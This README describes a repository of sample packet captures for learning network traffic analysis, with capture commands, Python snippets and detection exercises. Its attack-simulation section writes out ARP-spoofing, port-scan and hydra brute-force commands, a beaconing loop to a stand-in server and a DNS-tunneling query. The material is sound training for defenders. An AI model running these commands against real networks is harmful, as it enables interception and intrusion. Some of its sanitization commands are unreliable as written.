
# 📁 Packet Capture Files - 516 Hackers

## 🎯 About This Directory

This directory contains sample packet capture files for educational and practice purposes. These files help you learn packet analysis without needing to capture live traffic.

> **516 Note**: All capture files in this directory are sanitized and contain no real personal information. They are generated in controlled lab environments for educational use only.

---

## 📊 Available Capture Files

### Basic Traffic Examples:

#### `http-basic.pcap`
- **Description**: Simple HTTP web browsing traffic
- **Contents**: 
  - HTTP GET requests and responses
  - HTML page loading
  - Image downloads
  - Cookie exchanges
- **Learning Objectives**:
  - Understand HTTP protocol flow
  - Analyze request/response patterns
  - Extract web objects
  - Follow TCP streams

#### `dns-queries.pcap`
- **Description**: DNS query and response traffic
- **Contents**:
  - DNS A record queries
  - DNS response packets
  - Recursive vs iterative queries
  - Multiple domain lookups
- **Learning Objectives**:
  - Analyze DNS protocol
  - Understand query/response flow
  - Identify DNS record types
  - Trace domain resolution

#### `tcp-handshake.pcap`
- **Description**: TCP three-way handshake demonstration
- **Contents**:
  - SYN, SYN-ACK, ACK packets
  - TCP connection establishment
  - Sequence number analysis
  - Connection teardown (FIN)
- **Learning Objectives**:
  - Understand TCP handshake process
  - Analyze sequence numbers
  - Identify connection states
  - Troubleshoot connection issues

#### `arp-traffic.pcap`
- **Description**: ARP requests and responses
- **Contents**:
  - ARP request broadcasts
  - ARP response packets
  - MAC address resolution
  - Network discovery traffic
- **Learning Objectives**:
  - Understand ARP protocol
  - Analyze MAC/IP mapping
  - Identify network devices
  - Detect ARP spoofing

### Security Scenarios:

#### `arp-spoofing.pcap`
- **Description**: ARP spoofing attack demonstration
- **Contents**:
  - Legitimate ARP traffic
  - Malicious ARP replies
  - MAC address conflicts
  - Gratuitous ARP packets
- **Learning Objectives**:
  - Identify ARP spoofing patterns
  - Detect MAC address changes
  - Analyze attack methodology
  - Create detection rules

#### `port-scan.pcap`
- **Description**: Network port scanning activity
- **Contents**:
  - SYN scans
  - Connect scans
  - UDP scans
  - Service detection
- **Learning Objectives**:
  - Recognize scanning patterns
  - Identify scan types
  - Analyze timing patterns
  - Create intrusion detection rules

#### `brute-force.pcap`
- **Description**: Login brute force attempts
- **Contents**:
  - Multiple failed login attempts
  - Successful authentication
  - Protocol-specific attacks (FTP, SSH)
  - Account lockout patterns
- **Learning Objectives**:
  - Identify brute force patterns
  - Analyze authentication failures
  - Detect credential stuffing
  - Create mitigation rules

#### `malware-c2.pcap`
- **Description**: Malware command and control traffic
- **Contents**:
  - Beaconing patterns
  - C2 server communication
  - Data exfiltration attempts
  - DNS tunneling indicators
- **Learning Objectives**:
  - Recognize C2 traffic patterns
  - Analyze beaconing intervals
  - Identify data exfiltration
  - Create IOC detection rules

### Protocol Specific:

#### `voip-calls.pcap`
- **Description**: Voice over IP conversations
- **Contents**:
  - SIP signaling
  - RTP media streams
  - Call setup and teardown
  - Voice codec negotiation
- **Learning Objectives**:
  - Analyze VoIP protocols
  - Reconstruct voice conversations
  - Understand SIP messaging
  - Troubleshoot call quality

#### `ftp-transfer.pcap`
- **Description**: File transfer protocol sessions
- **Contents**:
  - FTP control channel
  - Data transfer sessions
  - Authentication process
  - File uploads/downloads
- **Learning Objectives**:
  - Understand FTP protocol
  - Analyze file transfers
  - Extract transferred files
  - Identify security issues

#### `email-traffic.pcap`
- **Description**: Email protocol traffic
- **Contents**:
  - SMTP message transfer
  - POP3 email retrieval
  - IMAP folder synchronization
  - Email authentication
- **Learning Objectives**:
  - Analyze email protocols
  - Trace message flow
  - Identify email headers
  - Detect spam patterns

#### `iot-devices.pcap`
- **Description**: Internet of Things device communication
- **Contents**:
  - MQTT protocol messages
  - CoAP requests/responses
  - Device discovery
  - Sensor data transmission
- **Learning Objectives**:
  - Understand IoT protocols
  - Analyze device communication
  - Identify data patterns
  - Assess security risks

---

## 🔧 Generating Your Own Captures

### Using TCPDump:
```bash
# Basic capture on specific interface
sudo tcpdump -i eth0 -w my_capture.pcap

# Capture with filter (HTTP traffic only)
sudo tcpdump -i eth0 -w http_traffic.pcap 'tcp port 80'

# Capture specific number of packets
sudo tcpdump -i eth0 -c 1000 -w limited_capture.pcap

# Capture with verbose output
sudo tcpdump -i eth0 -v -w verbose_capture.pcap

# Capture with size limit per packet
sudo tcpdump -i eth0 -s 96 -w small_packets.pcap

# Capture all traffic on interface
sudo tcpdump -i eth0 -w all_traffic.pcap

# Capture with ring buffer (multiple files)
sudo tcpdump -i eth0 -w capture -C 10 -W 5
```

### Using Bettercap:
```bash
# Start bettercap and save to file
sudo bettercap -iface eth0
set net.sniff.output my_capture.pcap
net.sniff on

# One-liner for quick capture
sudo bettercap -iface eth0 -eval "set net.sniff.output quick_capture.pcap; net.sniff on; sleep 60; net.sniff off"

# Capture with specific filter
sudo bettercap -iface eth0 -eval "set net.sniff.output filtered.pcap; set net.sniff.filter 'tcp port 80'; net.sniff on"
```

### Using Wireshark:
```bash
# Command line capture
wireshark -i eth0 -k -w wireshark_capture.pcap

# Capture with specific filter
wireshark -i eth0 -f "tcp port 443" -w https_traffic.pcap

# Capture specific duration
timeout 300 wireshark -i eth0 -k -w 5min_capture.pcap
```

### Using TShark:
```bash
# Basic capture
tshark -i eth0 -w tshark_capture.pcap

# Capture with display filter
tshark -i eth0 -f "tcp port 22" -w ssh_traffic.pcap

# Capture specific fields only
tshark -i eth0 -T fields -e frame.time -e ip.src -e ip.dst -e tcp.port -w fields_capture.pcap
```

---

## 📖 How to Use These Files

### With Wireshark (GUI):
```bash
# Open capture file
wireshark capture_file.pcap

# Or from command line
wireshark -r capture_file.pcap
```

### With TShark (Command Line):
```bash
# Basic file reading
tshark -r capture_file.pcap

# Read with display filter
tshark -r capture_file.pcap -Y "http"

# Extract specific information
tshark -r capture_file.pcap -T fields -e http.request.uri

# Generate statistics
tshark -r capture_file.pcap -z http,stat
tshark -r capture_file.pcap -z conv,tcp
```

### With Python Scapy:
```python
from scapy.all import *

# Read capture file
packets = rdpcap("capture_file.pcap")

# Basic analysis
print(f"Total packets: {len(packets)}")
print(f"File info: {packets}")

# Iterate through packets
for packet in packets:
    if packet.haslayer(IP):
        print(f"IP: {packet[IP].src} -> {packet[IP].dst}")

# Filter specific protocols
http_packets = [pkt for pkt in packets if pkt.haslayer(TCP) and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80)]
```

### With Python PyShark:
```python
import pyshark

# Read capture file
cap = pyshark.FileCapture('capture_file.pcap')

# Analyze packets
for packet in cap:
    print(f"Packet: {packet}")
    
    if 'IP' in packet:
        print(f"Source: {packet.ip.src}")
        print(f"Destination: {packet.ip.dst}")
```

---

## 🎯 Practice Exercises

### Exercise 1: HTTP Analysis
**File**: `http-basic.pcap`

**Steps**:
1. Open the capture file in Wireshark
2. Apply filter: `http`
3. Follow TCP streams for different sessions
4. Export HTTP objects (images, files)
5. Analyze request headers and response codes
6. Look for cookies and session data

**Questions to Answer**:
- How many HTTP requests were made?
- What websites were visited?
- Were there any POST requests with data?
- What user agents were used?

### Exercise 2: DNS Analysis
**File**: `dns-queries.pcap`

**Steps**:
1. Open the capture file
2. Apply filter: `dns`
3. Analyze query/response patterns
4. Identify recursive vs iterative queries
5. Look for DNS errors or unusual responses

**Questions to Answer**:
- What domains were queried?
- What DNS servers were used?
- Were there any failed DNS lookups?
- What record types were requested?

### Exercise 3: ARP Spoofing Detection
**File**: `arp-spoofing.pcap`

**Steps**:
1. Open the capture file
2. Apply filter: `arp`
3. Look for MAC address conflicts
4. Identify gratuitous ARP packets
5. Analyze ARP reply patterns

**Questions to Answer**:
- Which IP addresses show MAC conflicts?
- When did the spoofing attack start?
- What was the attacker's MAC address?
- How many hosts were affected?

### Exercise 4: Port Scan Analysis
**File**: `port-scan.pcap`

**Steps**:
1. Open the capture file
2. Look for SYN packets to multiple ports
3. Analyze timing patterns
4. Identify the scanning methodology
5. Check for service responses

**Questions to Answer**:
- What type of scan was performed?
- Which ports were targeted?
- What services were discovered?
- Was the scan successful?

### Exercise 5: Malware Traffic Analysis
**File**: `malware-c2.pcap`

**Steps**:
1. Open the capture file
2. Look for regular beaconing patterns
3. Analyze DNS queries for unusual domains
4. Search for data exfiltration
5. Identify C2 communication

**Questions to Answer**:
- What is the beaconing interval?
- Which domains are used for C2?
- Is there data being exfiltrated?
- What protocols are used for communication?

---

## 🔒 Privacy Notice

### Data Sanitization:
- All capture files are generated in lab environments
- No real personal information is included
- MAC addresses are randomized
- IP addresses use private ranges (RFC 1918)
- No real credentials or sensitive data

### Safe Usage:
```bash
# Always sanitize captures before sharing
editcap -r original.pcap sanitized.pcap

# Remove specific data
tshark -r original.pcap -Y "not (http.cookie)" -w sanitized.pcap

# Anonymize IP addresses
anonip -i original.pcap -o anonymized.pcap
```

### Legal Compliance:
- Use only for educational purposes
- Follow organizational policies
- Respect privacy laws and regulations
- Obtain proper authorization for testing

---

## 📈 Creating Practice Scenarios

### Normal Traffic Generation:
```bash
# Generate web traffic
curl -s http://example.com > /dev/null
wget http://example.com
ping -c 5 google.com
nslookup example.com

# Generate various protocol traffic
telnet example.com 80
ftp localhost
ssh user@localhost
```

### Attack Simulation:
```bash
# ARP spoofing simulation
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on"

# Port scanning simulation
nmap -sS 192.168.1.0/24
nmap -sU 192.168.1.100

# Brute force simulation
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form
```

### Malware Simulation:
```bash
# Simulate beaconing (replace with your server)
while true; do curl -s http://your-server.com/beacon; sleep 60; done

# DNS tunneling simulation
dig @8.8.8.8 A $(echo "data" | base64).example.com
```

---

## 🌐 Online Capture Resources

### Free PCAP Repositories:
- [Wireshark Sample Captures](https://wiki.wireshark.org/SampleCaptures) - Official sample captures
- [Malware Traffic Analysis](https://www.malware-traffic-analysis.net/) - Real malware traffic
- [NetResec](https://www.netresec.com/?page=PCAP) - Various capture files
- [Packet Total](https://packettotal.com/) - PCAP analysis and sharing
- [CTFTime](https://ctftime.org/) - Capture files from CTF competitions

### Capture Challenges:
- [SANS Forensics Challenges](https://digital-forensics.sans.org/community/challenges)
- [Honeynet Project Challenges](https://honeynet.org/challenges)
- [DFIR Diva](https://dfirdiva.com/dfir-challenges/)
- [Cyberseclabs](https://www.cyberseclabs.co.uk/)

### Capture Tools:
- [PCAPR](https://pcapr.net/) - Community packet capture sharing
- [CloudShark](https://www.cloudshark.org/) - Online PCAP analysis
- [PacketBeat](https://www.elastic.co/beats/packetbeat) - Real-time network monitoring

---

## 🛠️ Capture Best Practices

### Ethical Capturing:
```bash
# Always get proper authorization
# Document capture purpose and scope
# Respect privacy and data protection laws
# Use on networks you own or have permission to test
```

### Technical Best Practices:
```bash
# Use appropriate filters to reduce noise
sudo tcpdump -i eth0 -w capture.pcap 'not arp and not port 53'

# Set reasonable file sizes
sudo tcpdump -i eth0 -w capture.pcap -C 100

# Include relevant traffic only
sudo tcpdump -i eth0 -w capture.pcap 'host 192.168.1.100'

# Document capture context
echo "Capture started: $(date)" > capture_info.txt
echo "Interface: eth0" >> capture_info.txt
echo "Filter: tcp port 80" >> capture_info.txt
```

### Storage and Management:
```bash
# Compress old captures
gzip large_capture.pcap

# Use descriptive filenames
2024-01-15_HTTP_LoginTraffic.pcap
2024-01-15_DNS_QueryAnalysis.pcap

# Maintain capture logs
ls -la *.pcap > capture_index.txt
```

### Performance Considerations:
```bash
# Limit packet size to save space
sudo tcpdump -i eth0 -s 96 -w capture.pcap

# Use ring buffers for long captures
sudo tcpdump -i eth0 -w capture -C 100 -W 10

# Monitor capture file size
watch -n 5 'ls -lh capture*.pcap'
```

---

## 📝 Capture Documentation

### File Naming Convention:
```
YYYY-MM-DD_Protocol_Description.pcap

Examples:
2024-01-15_HTTP_LoginTraffic.pcap
2024-01-15_DNS_QueryAnalysis.pcap
2024-01-15_ARP_SpoofingAttack.pcap
2024-01-15_TCP_PortScan.pcap
```

### Metadata Files:
Create `capture-info.txt` with each capture:
```
Date: YYYY-MM-DD
Time: HH:MM:SS
Interface: eth0
Filter: tcp port 80
Purpose: HTTP traffic analysis
Notes: Normal browsing traffic from workstation
Duration: 5 minutes
Size: 15MB
```

### Capture Log Template:
```bash
#!/bin/bash
# capture_log.sh

CAPTURE_FILE=$1
INTERFACE=$2
FILTER=$3

echo "=== Capture Log ===" > ${CAPTURE_FILE}.log
echo "File: ${CAPTURE_FILE}" >> ${CAPTURE_FILE}.log
echo "Interface: ${INTERFACE}" >> ${CAPTURE_FILE}.log
echo "Filter: ${FILTER}" >> ${CAPTURE_FILE}.log
echo "Start: $(date)" >> ${CAPTURE_FILE}.log
echo "User: $(whoami)" >> ${CAPTURE_FILE}.log
echo "Host: $(hostname)" >> ${CAPTURE_FILE}.log
```

---

## 🔄 Converting Capture Formats

### Common Conversions:
```bash
# PCAP to PCAPNG (new format)
editcap -F pcapng input.pcap output.pcapng

# Extract specific packets
editcap -r input.pcap output.pcap 1-1000

# Merge capture files
mergecap -w merged.pcap file1.pcap file2.pcap file3.pcap

# Split large files
editcap -c 10000 large.pcap split.pcap

# Remove duplicate packets
editcap -d input.pcap output.pcap
```

### Format Utilities:
```bash
# Get file information
capinfos capture.pcap

# Convert to text format
tshark -r capture.pcap -V > capture.txt

# Export to CSV
tshark -r capture.pcap -T fields -e frame.time -e ip.src -e ip.dst -E header=y -E separator=, > capture.csv

# Convert to JSON
tshark -r capture.pcap -T json > capture.json
```

---

## ⚠️ Legal and Safe Usage

### Always Remember:
- These files are for **EDUCATION ONLY**
- Use in authorized environments only
- Don't use for malicious purposes
- Respect privacy and legal boundaries

### Safe Analysis Environment:
```bash
# Use isolated lab networks
# Employ virtual machines for testing
# Keep security tools updated
# Follow organizational security policies
# Document all testing activities
```

### Incident Response Usage:
```bash
# Preserve evidence integrity
md5sum capture.pcap > capture.pcap.md5

# Document chain of custody
echo "Collected by: John Doe" > evidence_log.txt
echo "Time: $(date)" >> evidence_log.txt
echo "Location: Server Room" >> evidence_log.txt

# Secure storage
chmod 600 sensitive_capture.pcap
```

---

## 🤝 Contributing Captures

### We Welcome:
- Educational capture files
- Interesting traffic scenarios
- Well-documented examples
- Various protocol examples
- Real-world case studies (sanitized)

### Contribution Guidelines:
1. **Sanitize all personal data**
2. **Include comprehensive documentation**
3. **Test files before submitting**
4. **Follow naming conventions**
5. **Provide learning objectives**
6. **Include analysis questions**

### Submission Process:
```bash
# 1. Sanitize capture
editcap -r original.pcap sanitized.pcap

# 2. Create documentation
echo "Description: HTTP traffic with file upload" > README.txt
echo "Learning: Analyze POST requests and file transfers" >> README.txt

# 3. Verify file integrity
md5sum sanitized.pcap > checksum.md5

# 4. Submit via pull request
```

---

## 🚀 Next Steps

After practicing with these captures:

### Skill Development Path:
1. **Beginner**: Analyze provided capture files
2. **Intermediate**: Capture your own traffic (with permission)
3. **Advanced**: Analyze real-world security incidents
4. **Expert**: Create detection rules and automation

### Advanced Topics:
- **Encrypted traffic analysis**
- **Network forensics**
- **Incident response**
- **Threat hunting**
- **Malware analysis**
- **Performance optimization**

### Career Applications:
- **Network Administrator**
- **Security Analyst**
- **Incident Responder**
- **Forensic Investigator**
- **Threat Hunter**
- **Security Researcher**

---

*"In packets, we find truth. In analysis, we find understanding. In practice, we find mastery." - 516 Hackers*

---
*516 Hackers - Practice Makes Perfect*
